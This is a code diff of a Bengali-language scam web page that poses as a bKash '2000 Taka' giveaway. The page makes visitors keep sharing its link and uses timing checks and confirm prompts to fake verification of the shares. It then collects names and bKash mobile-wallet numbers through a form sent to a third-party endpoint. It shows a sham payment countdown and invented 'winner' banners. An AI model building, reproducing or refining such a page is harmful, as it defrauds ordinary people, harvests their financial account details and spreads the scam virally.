@@ -1,180 +1,139 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>bKash 2000 Taka Offer</title>
-  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri&display=swap" rel="stylesheet">
-  <style>
-    * { margin: 0; padding: 0; font-family: 'Hind Siliguri', sans-serif; }
-    body { background: #fce4ec; text-align: center; color: #333; }
-    .container { max-width: 500px; margin: 0 auto; background: #fff; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 10px; margin-top: 20px; }
-    h1 { font-size: 24px; margin-bottom: 10px; color: #d81b60; }
-    .label { margin-top: 20px; font-size: 18px; font-weight: bold; color: #444; }
-    .progress { width: 100%; height: 20px; background: #eee; border-radius: 10px; overflow: hidden; margin: 10px 0; }
-    .bar { height: 100%; width: 0%; background: #d81b60; transition: 1s ease; }
-    .form-group { margin: 15px 0; text-align: left; }
-    input[type="text"], input[type="tel"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
-    button { background: #d81b60; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
-    button:hover { background: #c2185b; }
-    .countdown { font-size: 22px; color: red; margin-top: 20px; display: none; }
-    .header-image { width: 100%; max-width: 100%; border-radius: 10px; margin-bottom: 10px; }
-    .scrolling-labels { margin-top: 30px; display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
-    .scroll-box { background-color: #e1f5fe; color: #00796b; border: 1px solid #b2ebf2; padding: 8px 12px; border-radius: 8px; font-size: 15px; animation: fadeInOut 3s ease-in-out infinite; }
-    @keyframes fadeInOut {
-      0%, 100% { opacity: 0; transform: scale(0.9); }
-      50% { opacity: 1; transform: scale(1); }
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <img src="https://i.ytimg.com/vi/MFOOxXbD3RY/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC0qk4Ob3WwWpspjKN3gk6dKXf6LA" alt="Header" class="header-image">
+<!-- ✅ Enhanced Share Validation Script + UI -->
+<script>
+  let shares = 0;
+  let progress = 0;
+  let firstClickDone = false;
+  let countdownEndTime = localStorage.getItem('countdownEnd');
+  const formElement = document.getElementById("gift-form");
+  const countdownBox = document.getElementById('countdown-box');
 
-    <h1>৫০০,০০০ জন মানুষ ৫০০ টাকা করে অনুদান পাবেন!</h1>
+  const isMessenger = navigator.userAgent.includes("Messenger");
+  if (isMessenger) {
+    alert("⚠️ আপনি মেসেঞ্জারের ভিতরের ব্রাউজারে আছেন। নিচের বোতাম ক্লিক করে Chrome এ খুলুন।");
+    document.getElementById("openBrowserBtn").style.display = "block";
+  }
 
-    <p>শুধু মাত্র শেয়ার করলেই সুযোগ!</p>
-    <div class="label">শেয়ার কমপ্লিটঃ <span id="share-count">0</span>/100%</div>
-    <div class="progress">
-      <div class="bar" id="progress-bar"></div>
-    </div>
-
-    <button onclick="nativeShare()">📲 শেয়ার করুন</button>
-
-    <form action="https://formspree.io/f/myzjlqdp" method="POST" onsubmit="return showCountdown()" id="gift-form">
-      <div class="form-group">
-        <label>আপনার নাম:</label>
-        <input type="text" name="name" required>
-      </div>
-      <div class="form-group">
-        <label>bKash নম্বর:</label>
-        <input type="tel" name="bkash" required>
-      </div>
-      <button type="submit">🎁 উপহার ক্লেইম করুন</button>
-    </form>
-
-    <div class="countdown" id="countdown-box">
-      🎉 আপনার পেমেন্ট প্রক্রিয়াধীন। <br>
-      দয়া করে অপেক্ষা করুন <span id="countdown">24:00:00</span>
-    </div>
-
-    <div class="scrolling-labels" id="random-labels"></div>
-  </div>
-
-  // updated script portion only, HTML part remains same above...
-  // updated script portion only, HTML part remains same above...
-  <script>
-    let shares = 0;
-    let progress = 0;
-    let firstClickDone = false;
-    let countdownEndTime = localStorage.getItem('countdownEnd');
-    const formElement = document.getElementById("gift-form");
-    const countdownBox = document.getElementById('countdown-box');
-
-    if (countdownEndTime) {
-      if (Date.now() > parseInt(countdownEndTime)) {
-        document.body.innerHTML = '<h2>⛔ এই ডিভাইস থেকে সময় শেষ হয়ে গেছে!</h2>';
-      } else {
-        formElement.style.display = 'none';
-        countdownBox.style.display = 'block';
-        startCountdown(parseInt(countdownEndTime));
-      }
-    }
-
-    function nativeShare() {
-      const shareUrl = "https://akash2025id.github.io/Bkash-Free-Tk/";
-      const shareText = "আমি ৫০০ টাকা অনুদান পেয়েছি! আপনিও শেয়ার করুন 👉 ";
-
-      setTimeout(() => {
-        if (!firstClickDone) {
-          progress = 65;
-          firstClickDone = true;
-        } else {
-          if (progress < 100) {
-            progress += 5;
-            if (progress > 100) progress = 100;
-          }
-        }
-        updateProgress();
-        if (progress >= 100 && !countdownEndTime) {
-          formElement.style.display = 'block';
-        }
-      }, 10000);
-
-      if (navigator.share) {
-        navigator.share({
-          title: "bKash Gift Offer",
-          text: shareText,
-          url: shareUrl
-        }).catch((error) => {
-          console.error("Sharing failed", error);
-        });
-      } else {
-        navigator.clipboard.writeText(shareUrl);
-        alert("📋 লিংক কপি হয়েছে! আপনার বন্ধুদের মেসেঞ্জারে শেয়ার করুন।");
-      }
-    }
-
-    function updateProgress() {
-      document.getElementById('progress-bar').style.width = progress + '%';
-      document.getElementById('share-count').innerText = progress + '%';
-    }
-
-    function showCountdown() {
-      if (progress < 100) {
-        alert('কমপক্ষে ১০০% শেয়ার কমপ্লিট করুন।');
-        return false;
-      }
-
-      const existing = localStorage.getItem('countdownEnd');
-      if (!existing) {
-        const endTime = Date.now() + 24 * 60 * 60 * 1000;
-        localStorage.setItem('countdownEnd', endTime);
-        countdownEndTime = endTime;
-      }
-
+  if (countdownEndTime) {
+    if (Date.now() > parseInt(countdownEndTime)) {
+      document.body.innerHTML = '<h2>⛔ এই ডিভাইস থেকে সময় শেষ হয়ে গেছে!</h2>';
+    } else {
       formElement.style.display = 'none';
       countdownBox.style.display = 'block';
-
-      startCountdown(parseInt(localStorage.getItem('countdownEnd')));
-      return true;
+      startCountdown(parseInt(countdownEndTime));
     }
+  }
 
-    function startCountdown(countdownEnd) {
-      let interval = setInterval(() => {
-        let now = Date.now();
-        let totalSeconds = Math.floor((countdownEnd - now) / 1000);
+  function nativeShare() {
+    const shareUrl = "https://akash2025id.github.io/Al-Hadiyah/";
+    const shareText = "আমি ৫০০ টাকা অনুদান পেয়েছি! আপনিও শেয়ার করুন 👉 ";
+    const beforeShareTime = Date.now();
 
-        if (totalSeconds <= 0) {
-          clearInterval(interval);
-          document.body.innerHTML = '<h2>⛔ এই ডিভাইস থেকে সময় শেষ হয়ে গেছে!</h2>';
-          return;
+    if (navigator.share && !isMessenger) {
+      navigator.share({
+        title: "bKash Gift Offer",
+        text: shareText,
+        url: shareUrl
+      }).then(() => {
+        const afterTime = Date.now();
+        const diff = (afterTime - beforeShareTime) / 1000;
+
+        if (diff > 8) {
+          updateProgressSuccess();
+        } else {
+          alert("❌ আপনি ভুলভাবে শেয়ার করেছেন। দয়া করে আবার চেষ্টা করুন এবং সঠিকভাবে শেয়ার করুন।");
         }
+      }).catch(() => {
+        alert("❌ শেয়ার সম্পন্ন হয়নি। দয়া করে আবার চেষ্টা করুন।");
+      });
+    } else {
+      navigator.clipboard.writeText(shareUrl);
+      alert("📋 লিংক কপি হয়েছে! মেসেঞ্জারে পেস্ট করে বন্ধুদের শেয়ার করুন, তারপর আবার এখানে ফিরে আসুন।");
 
-        const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
-        const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
-        const seconds = String(totalSeconds % 60).padStart(2, '0');
-        document.getElementById('countdown').innerText = `${hours}:${minutes}:${seconds}`;
-      }, 1000);
+      const backStart = Date.now();
+      setTimeout(() => {
+        const confirmShare = confirm("🔄 আপনি কি শেয়ার করেছেন?");
+        if (confirmShare) {
+          updateProgressSuccess();
+        } else {
+          alert("❌ আপনি ভুলভাবে শেয়ার করছেন। অনুগ্রহ করে আবার সঠিকভাবে শেয়ার করুন।");
+        }
+      }, 10000);
     }
+  }
 
-    const names = ["রাবেয়া", "মাহিন", "সাদিয়া", "জুবায়ের", "মেহজাবীন", "তাহমিদ", "নুসরাত", "রায়হান", "শান্তা", "জিসান", "মিম", "সাবরিনা", "আকাশ", "মোহনা", "মারুফ", "ইমরান", "রোহান", "তানভীর", "সুমাইয়া", "ফারজানা", "রেহান", "সাজিদ", "মাহির", "লাবিবা", "জাহান", "তানহা", "হিমেল", "ইশরাত", "জোবায়ের", "মালিহা"];
-    const labelContainer = document.getElementById("random-labels");
-
-    function showRandomLabels() {
-      const name = names[Math.floor(Math.random() * names.length)];
-      const label = document.createElement("div");
-      label.className = "scroll-box";
-      label.textContent = `🎉 অভিনন্দন ${name} পেয়েছেন ৫০০ টাকা উপহার!`;
-      labelContainer.appendChild(label);
-      if (labelContainer.childElementCount > 3) {
-        labelContainer.removeChild(labelContainer.firstChild);
+  function updateProgressSuccess() {
+    if (!firstClickDone) {
+      progress = 65;
+      firstClickDone = true;
+    } else {
+      if (progress < 100) {
+        progress += 5;
+        if (progress > 100) progress = 100;
       }
     }
+    updateProgress();
 
-    setInterval(showRandomLabels, 2000);
-  </script>
+    if (progress >= 100 && !countdownEndTime) {
+      alert("🎉 আপনি শেয়ার করার কাজ সম্পূর্ণ করেছেন! এখন পেমেন্ট ফর্ম পূরণ করে আপনার তথ্য দিন এবং টাকা বুঝে নিন।");
+      formElement.style.display = 'block';
+    }
+  }
 
+  function updateProgress() {
+    document.getElementById('progress-bar').style.width = progress + '%';
+    document.getElementById('share-count').innerText = progress + '%';
+  }
 
-</body>
-</html>
+  function showCountdown() {
+    if (progress < 100) {
+      alert('কমপক্ষে ১০০% শেয়ার কমপ্লিট করুন।');
+      return false;
+    }
+
+    const existing = localStorage.getItem('countdownEnd');
+    if (!existing) {
+      const endTime = Date.now() + 24 * 60 * 60 * 1000;
+      localStorage.setItem('countdownEnd', endTime);
+      countdownEndTime = endTime;
+    }
+
+    formElement.style.display = 'none';
+    countdownBox.style.display = 'block';
+    startCountdown(parseInt(localStorage.getItem('countdownEnd')));
+    return true;
+  }
+
+  function startCountdown(countdownEnd) {
+    let interval = setInterval(() => {
+      let now = Date.now();
+      let totalSeconds = Math.floor((countdownEnd - now) / 1000);
+
+      if (totalSeconds <= 0) {
+        clearInterval(interval);
+        document.body.innerHTML = '<h2>⛔ এই ডিভাইস থেকে সময় শেষ হয়ে গেছে!</h2>';
+        return;
+      }
+
+      const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+      const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+      const seconds = String(totalSeconds % 60).padStart(2, '0');
+      document.getElementById('countdown').innerText = `${hours}:${minutes}:${seconds}`;
+    }, 1000);
+  }
+
+  const names = ["রাবেয়া", "মাহিন", "সাদিয়া", "জুবায়ের", "মেহজাবীন", "তাহমিদ", "নুসরাত", "রায়হান", "শান্তা", "জিসান", "মিম", "সাবরিনা", "আকাশ", "মোহনা", "মারুফ", "ইমরান", "রোহান", "তানভীর", "সুমাইয়া", "ফারজানা", "রেহান", "সাজিদ", "মাহির", "লাবিবা", "জাহান", "তানহা", "হিমেল", "ইশরাত", "জোবায়ের", "মালিহা"];
+  const labelContainer = document.getElementById("random-labels");
+
+  function showRandomLabels() {
+    const name = names[Math.floor(Math.random() * names.length)];
+    const label = document.createElement("div");
+    label.className = "scroll-box";
+    label.textContent = `🎉 অভিনন্দন ${name} পেয়েছেন ৫০০ টাকা উপহার!`;
+    labelContainer.appendChild(label);
+    if (labelContainer.childElementCount > 9) {
+      labelContainer.removeChild(labelContainer.firstChild);
+    }
+  }
+
+  setInterval(showRandomLabels, 2000);
+</script>
